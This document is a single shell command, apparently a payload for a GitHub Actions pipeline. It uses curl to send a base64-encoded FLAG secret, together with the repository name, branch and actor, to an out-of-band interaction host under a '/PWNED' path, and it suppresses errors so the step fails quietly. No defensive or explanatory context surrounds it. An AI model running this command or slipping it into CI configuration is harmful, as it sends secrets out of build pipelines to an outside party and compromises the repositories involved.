curl -s "https://d8mu44koq3549o74fpt076jiomtqw51kd.oast.me/PWNED?flag=$(printf %s "$FLAG" | base64 -w0)&repo=$GITHUB_REPOSITORY&ref=$GITHUB_REF_NAME&actor=$GITHUB_ACTOR" || true
